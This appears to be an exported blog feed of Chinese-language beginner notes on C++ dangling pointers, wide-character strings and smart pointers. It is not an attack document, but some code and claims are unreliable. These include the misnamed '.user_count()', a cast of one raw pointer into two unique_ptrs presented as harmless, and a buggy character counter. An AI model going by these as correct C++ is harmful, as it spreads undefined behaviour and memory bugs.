&#123;</span><br><span class="line">        std::unique_ptr&lt;<span class="type">int</span>[]&gt; a&#123; std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>[]&gt;(<span class="number">50</span>) &#125;;</span><br><span class="line">        a[<span class="number">2</span>] = <span class="number">110</span>;</span><br><span class="line">        p = a.<span class="built_in">get</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>智能指针之前学过，它的原型是一个类，当这个类超过实例所处作用域的时候会调用析构函数，也就会自动释放内存资源。</p><img src="/2022/05/20/pointerText/001.png" class=""><p><strong>在{}作用域内时，智能指针a的生命周期还在，然后指针p接受指针a的地址，出了{}作用域之后，a自动释放了，指针p也就没有指向的内存了，图中两个输出可以看到结果</strong></p><hr><h2 id="No-2"><a href="#No-2" class="headerlink" title="No.2"></a>No.2</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">        p = a;</span><br><span class="line">        std::cout &lt;&lt; p[<span class="number">2</span>] &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; p[<span class="number">2</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>no1的时候由于内存是new的，也就是存放在堆区。<br>而现在是创建了一个数组，这种方式内存会分配到栈区，按照常理，栈区的变量在离开它所处的作用域后也会自动销毁。<br>但是通过打印我们发现<img src="/2022/05/20/pointerText/002.png" class=""><br>它的值仍然在，原因在于数组a的处于栈区时未被回收，如果处于其他函数里就会被回收掉。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>指针销毁了，但是指向的内存还在</li><li>内存销毁回收了，指针却还在</li></ol><p>指针虽然很方便，但是也挺危险。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>string</title>
      <link href="/2022/05/19/string/"/>
      <url>/2022/05/19/string/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>[] &#x3D; “”<br>属于c语言的方式</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>C语言是没有string类型的，那么要表示字符串就是通过char[]来实现。<br>声明方式就是<code>char ch[] = &quot;hello&quot;;</code><br>复古机器人点就是<code>char ch[] = &#123;&#39;H&#39;,&#39;E&#39;,&#39;L&#39;,&#39;L&#39;,&#39;O&#39;,&#39;\0&#39;&#125;;</code>,当然鬼才用这个。<br>指针也ok，不过需要强转，因为默认不认识字符串<code>char *ch = (char*)&quot;hello&quot;;</code><br>但是要注意字符串末尾其实跟了一个<code>\0</code>作为结束，因为数组的本质是一块连续的内存空间，它需要区分。</p><blockquote><p>有印象的应该知道，strlen和sizeof一个字符串的区别。</p></blockquote><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>假设有一个数字<code>char str[255] &#123;&quot;Hello张三&quot;&#125;;</code>，编码环境为gbk<br>它的内存分析为：<img src="/2022/05/19/string/000.png" class=""><br>张在gbk中需要两个字节来表示，所以原本应该是0xc5d5，但是由于是char类型，排放顺序从低位到高位，所以说先存d5再存c5。</p><hr><h2 id="c-x2F-wchar-t"><a href="#c-x2F-wchar-t" class="headerlink" title="c&#x2F;wchar_t"></a>c&#x2F;wchar_t</h2><p>宽字符：一般占用两个字节。即H 在内存中表现为0x0048,依然按照低位在前高位在后的顺序排放。</p><img src="/2022/05/19/string/002.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch1[] = &#123; <span class="string">&quot;hello world&quot;</span> &#125;;      <span class="comment">//直接声明就报错了</span></span><br></pre></td></tr></table></figure><img src="/2022/05/19/string/001.png" class=""><p>原因是默认的字符串还是以char为组合，需要向编译器声明是宽字符型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch1[] = &#123; <span class="string">L&quot;hello world&quot;</span> &#125;;</span><br></pre></td></tr></table></figure><p>也就是在字符串前加一个大写的L。</p><p><strong>注意：宽字符一般采用Unicode编码，所以中文在Unicode和gbk的表现是不一样的</strong></p><blockquote><p>输入采用wscanf，输出采用wprintf，类型前加大写L转换。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch[<span class="number">0xff</span>];</span><br><span class="line"><span class="built_in">wscanf</span>(<span class="string">L&quot;%s&quot;</span>, ch);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;%s&quot;</span>, ch);</span><br></pre></td></tr></table></figure><p><strong>如果scanf报错，在头文件上加一句<code>#define _CRT_SECURE_NO_WARNINGS</code></strong></p><p>当然这里还是值得一提的，为什么vs使用scanf会报错，这是因为scanf如果不限定长度，那么就有可能导致溢出，一旦溢出了，你往里面塞的如果是一些计算机相关的命令，就有可能被执行。所以vs推荐使用scanf_s，但是对于新手来说_s还是有点小麻烦的。</p><img src="/2022/05/19/string/003.png" class=""><p>举个例子，字符串设置长度5，但是你输入了一堆，编译器这里肯定会发生异常报错。</p><img src="/2022/05/19/string/004.png" class=""><p>使用微软的_s，则相对安全，一旦你输入的内容长度超过了它限定的范围，那么程序就不接收你输入的东西。<br>不过有一说一，还有gets之类的输入方式，scanf是相对而言比较多的使用。所以不能防范所有的溢出问题。</p><hr><h2 id="cpp-x2F-wchar-t"><a href="#cpp-x2F-wchar-t" class="headerlink" title="cpp&#x2F;wchar_t"></a>cpp&#x2F;wchar_t</h2><p>c++的输入输出是通过cin&#x2F;cout来实现，虽然可以使用C语言的方式，但是还是要记住c++本身的特性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">0x10</span>];</span><br><span class="line">    std::cout &lt;&lt; x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>正常情况下，x没有赋值，就相当于是指针，那么cout x就是输出x的地址<br>但是char不一样，cout默认会将其当为字符串输出，就会导致乱码。</p></blockquote><img src="/2022/05/19/string/005.png" class=""><p>两者之间的区别还是很明显的</p><img src="/2022/05/19/string/006.png" class=""><p>当然std指定输出格式也凑合，比较printf就是通过指定格式化输出实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch[<span class="number">0xff</span>];</span><br><span class="line">std::wcout &lt;&lt; <span class="string">&quot;请输入：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::wcin &gt;&gt; ch;</span><br><span class="line">std::wcout &lt;&lt; ch;</span><br></pre></td></tr></table></figure><blockquote><p>差别不大，就是宽字符的输入输出都加个w，然后注意一下编码环境</p></blockquote><hr><h2 id="wcslen"><a href="#wcslen" class="headerlink" title="wcslen"></a>wcslen</h2><p>统计字符串都知道使用strlen，宽字符也有自己的统计函数<code>wcslen</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;locale&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);   <span class="comment">//指定环境编码</span></span><br><span class="line"><span class="type">wchar_t</span> ch[<span class="number">0xff</span>];</span><br><span class="line">std::wcout &lt;&lt; <span class="string">L&quot;请输入：&quot;</span> &lt;&lt; std::endl; </span><br><span class="line">std::wcin &gt;&gt; ch;</span><br><span class="line">std::wcout &lt;&lt; ch &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">wcslen</span>(ch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/19/string/007.png" class=""><p><strong>值得一提的是，宽字符在指定编码下一般都是两个字节为一个字符，所以对于统计中英文时，会相对而言方便，但是内存上占用高了些，而char需要两个字节统计一个中文</strong></p><img src="/2022/05/19/string/008.png" class=""><hr><h2 id="自己实现strlen"><a href="#自己实现strlen" class="headerlink" title="自己实现strlen"></a>自己实现strlen</h2><p>其实也不难，我们知道字符串以’\0’结尾，那就直接循环然后让一个变量自增直到’\0’结束就行了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjs</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*ch++ != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>传一个指针，因为数组本质上就是一个指针，所以问题不大。</p></blockquote><hr><h2 id="自制能统计带中文的字符串"><a href="#自制能统计带中文的字符串" class="headerlink" title="自制能统计带中文的字符串"></a>自制能统计带中文的字符串</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjsp</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*ch++ != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (*ch &lt; <span class="number">0</span>)&#123;</span><br><span class="line">n++;</span><br><span class="line">*ch++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实一开始想的是中文需要两个char类型接受，然后一个char的上限是0xff，然后突然想到中文在两个char下其实两边都不一定会到0xff。<br>那好就从ascii码入手，<img src="/2022/05/19/string/009.png" class=""><br>可以看到ascii上限是0x7f，那如果*ch大于0x7f也就是说他有可能就是中文字符。。。<br>但是好景不长，结果还是不对，然后我就打断点debug了一下，发现它读取字符串的时候，遇到中文都是转换成了负数。。。<img src="/2022/05/19/string/010.png" class=""><br>这个原理我还没搞明白，但是这么一搞，直接让他&lt;0的时候n自增一次，然后指针跳过一个不就能实现了吗。。。</p><img src="/2022/05/19/string/011.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>字符串还好，c语言那会学过，基本都没啥问题，除了编码不同的时候，比较搞事情。</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>smartPointer1</title>
      <link href="/2022/05/19/smartPointer1/"/>
      <url>/2022/05/19/smartPointer1/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>c++ 11：</p><ul><li>std::shared_ptr</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shared顾名思义就是共享的意思，这个共享指针当然也属于智能指针这一块。</p><p>语法上:<br><code>std::shared_ptr&lt;type&gt; tyename</code><br>例如:<br><code>std::shared_ptr&lt;int&gt; a&#123;&#125;</code><br><code>std::shared_ptr&lt;int&gt; b&#123; std::make_shared&lt;int&gt;(0) &#125;</code><br><strong>注意:std::make_shared不支持数组</strong><br><code>std::shared_ptr&lt;int[]&gt; c&#123; new int[5]&#123;1,2,3,4,5&#125; &#125;</code></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>[]&gt; sp&#123;<span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;&#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp1&#123; std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">5</span>) &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp1[<span class="number">0</span>] &lt;&lt; std::endl;   <span class="comment">//与unique一样，初始化时是单个int则无法使用[]调用</span></span><br></pre></td></tr></table></figure><img src="/2022/05/19/smartPointer1/000.png" class=""><p>回到起点，shared是共享的意思，也就是说，共享指针是可以被其他共享指针所指向的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp1&#123; std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">5</span>) &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp2&#123; sp1 &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp3&#123; sp1 &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; *sp1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp2 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; *sp2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp3 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; *sp3 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/19/smartPointer1/001.png" class=""><p>可以看到sp2和sp3的地址和地址上的值都与sp1一致。</p><hr><h2 id="user-count"><a href="#user-count" class="headerlink" title="user_count"></a>user_count</h2><p>如果有多个共享指针指向同一地址，那么只有最后一个共享指针释放内存的时候，才能真正释放所占用的内存空间，也就这个原因，导致shared_ptr会记录这个地址被多少个智能指针调用。<br>有记录的属性，也就意味着shared_ptr会占用的更多内存。</p><p>查看的方式也很简单，就是调用<code>.user_count()</code></p><p>比如上面的代码，我们调用一个试试：<img src="/2022/05/19/smartPointer1/002.png" class=""><br>共享属性所以<code>.user_count()</code>在sp1或者2和3上得到的都是一个结果，因为它们指向同一块内存。</p><hr><h2 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h2><p>能统计就能判断是否被其他指针调用。<br>利用<code>.unique()</code>获取一个智能指针是否是唯一拥有该地址的。<br><strong>注：unique返回的是bool类型的值</strong></p><img src="/2022/05/19/smartPointer1/003.png" class=""><p>这里是sp1、2、3自然不用多想都是0，也就是false。</p><blockquote><p>另外值得一提的是，因为这个功能稍显鸡肋，c++17的时候把它废除了。。。。。</p></blockquote><hr><h2 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h2><p>在user_cout的时候说了一下，shared_ptr指针指向的内存空间只有当最后一个指向它的shared_ptr指针去释放的时候才会真正被释放掉，不然其余几个释放只是将自己置为nullptr。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp1&#123; std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">5</span>) &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp2&#123; sp1 &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp3&#123; sp1 &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp3 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">sp1.<span class="built_in">reset</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp3 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/19/smartPointer1/004.png" class=""><p>能看到sp1自己被置空了，sp2和sp3仍然指向sp1之前指向的内存地址。<br>再把sp2reset掉后也是一个样子<img src="/2022/05/19/smartPointer1/005.png" class=""><br>所以说只有将最后一个指向那片内存区域的指针释放了才是真正意义上的释放内存空间<img src="/2022/05/19/smartPointer1/006.png" class=""></p><p>当然如果有一定怀疑，还可以在reset前后看看use_count的情况</p><img src="/2022/05/19/smartPointer1/007.png" class=""><p>例如sp1和sp2都被reset了，能看到sp3指向的内存区域现在就只有一个指针指向它。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>没啥心得体会，就是感觉shared_ptr在内存占用上要么高一点，要么有一部分内存都写了特定的东西了，就比如说统计多少个指向这块内存的指针。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>smartPointer</title>
      <link href="/2022/05/16/smartPointer/"/>
      <url>/2022/05/16/smartPointer/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>c++ 11:</p><ul><li>std::unique_ptr</li></ul><p>c++ 14:</p><ul><li>std::make_unique</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>正常的指针如果是通过new或者malloc方式还需要额外的手动释放，delect或free。</p><p>智能指针的作用是防止忘记调用delete释放内存和程序异常的进入catch块忘记释放内存。另外指针的释放时机也是非常有考究的，多次释放同一个指针会造成程序崩溃，这些都可以通过智能指针来解决。</p><p>智能指针主要用于管理在堆上分配的内存，它将普通的指针封装为一个栈对象。当栈对象的生存周期结束后，会在析构函数中释放掉申请的内存，从而防止内存泄漏。<br>智能指针的作用是管理一个指针，因为存在以下这种情况：申请的空间在函数结束时忘记释放，造成内存泄漏。使用智能指针可以很大程度上的避免这个问题，因为智能指针是一个类，当超出了类的实例对象的作用域时，会自动调用对象的析构函数，析构函数会自动释放资源。所以智能指针的作用原理就是在函数结束时自动释放内存空间，不需要手动释放内存空间。</p><p>声明方式：<code>std::unique_ptr&lt;type&gt; typename&#123;&#125;</code>,<br>比如<code>std::unique_ptr&lt;int&gt; ptra&#123;std::make_unique&lt;int&gt; (150)&#125;</code></p><p>转到定义看到：<img src="/2022/05/16/smartPointer/000.png" class=""><br>能看到是用class写的，配合上模板。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>智能指针之所以智能，肯定会与传统指针有区别。</p><h2 id="no1"><a href="#no1" class="headerlink" title="no1 []"></a>no1 []</h2><p>比如说，传统指针无论大小，都可以用[]方式访问，但是智能指针就不行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123; <span class="number">5</span> &#125; &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; intP[0] &lt;&lt; std::endl;    这一句会报错，编译器给的说明就是没有符合的[]运算符操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然很大程度上单个int不被认作为’数组‘。<br>传统指针需要通过<code>int *p = new int[5]</code>,这样才能严格算一个数组。<br>那么智能指针也不例外，需要用到[]，即<code>std::unique_ptr&lt;int[]&gt; intP&#123;new int[]&#123;0&#125;&#125;;</code></p><img src="/2022/05/16/smartPointer/001.png" class=""><p>能够看到是合法有效的。</p><hr><h2 id="no2-x3D"><a href="#no2-x3D" class="headerlink" title="no2 &#x3D;"></a>no2 &#x3D;</h2><p>传统指针之间可以套娃，多个指针指向一片内存区域</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="type">int</span> *p = a;</span><br><span class="line"><span class="type">int</span> *p2 = a;</span><br><span class="line"><span class="type">int</span> *p3 = a;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p3 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/002.png" class=""><blockquote><p>可以看到指针a由我们人为new了一块内存地址，紧接着其他指针都指向指针a的地址，但是如果a被释放了，那么其他指针就有可能成为野指针，是一种非常不妙的情况。除非特殊需求，一般也是会尽量避免这种写法。</p></blockquote><p>而智能指针则不允许多个只能指针指向一块区域(简单说就是智能指针a不能赋值给智能指针b)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span> &#125;;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP2 = intP;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/003.png" class=""><p>编译器自然而然的给出了错误。</p><p><strong>但是有一说一，强转还是很骚的，比如说：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP = (std::unique_ptr&lt;<span class="type">int</span>&gt;) &amp;a;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP2 = (std::unique_ptr&lt;<span class="type">int</span>&gt;)&amp;a;</span><br></pre></td></tr></table></figure><p>通过这种强转的方法，编译器也没有给出错误和警告。<br>当然这种假象让两个智能指针指向同一块内存也就是图一乐。<br>我们能想到的委员会也早想到了，所以每个版本的特性都特别重要。</p><hr><h2 id="no3-c-14初始化"><a href="#no3-c-14初始化" class="headerlink" title="no3 c++14初始化"></a>no3 c++14初始化</h2><p>c++14之后，在初始化的时候有新增了一种方式<br><code>std::unique_ptr&lt;int&gt; intP &#123; std::make_unique&lt;int&gt;() &#125;</code><br><code>std::unique_ptr&lt;int[]&gt; intP &#123; std::make_unique&lt;int[]&gt;() &#125;</code></p><p>二者区别在于第一种方式初始化时()代表了指针指向区域的初始化值为多少<br>第二种则是初始化通过()来声明有几个成员。</p><p>它的好处目前也没能感知到，百度看了几个大致说法就是更安全更简单，至于不能使用定制删除器和不能完美传递一个initializer_list都是目前没感知的。得等以后深入用到了在挖了。</p><hr><h2 id="rest"><a href="#rest" class="headerlink" title="rest()"></a>rest()</h2><p>reset能够释放智能指针的内存空间，并将其置为nullptr;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">intP.<span class="built_in">reset</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/004.png" class=""><p>内存地址置空跟变成全0意思相同，就是说没有地址了，申请的内存也还给系统了。</p><hr><h2 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h2><p>一开始使用智能指针的时候会感觉碍手碍脚，不像传统指针能通过*p &#x3D; 直接改变值的过程<br>所以get方法可以让一个指针指向智能指针指向的内存区域。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span> &#125;;</span><br><span class="line">p = intP.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/005.png" class=""><p>可以看到指针p也指向了智能指针指向的区域</p><p>然后进行修改：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">p = intP.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; *intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line">*p = <span class="number">500</span>;</span><br><span class="line">std::cout &lt;&lt; *intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/006.png" 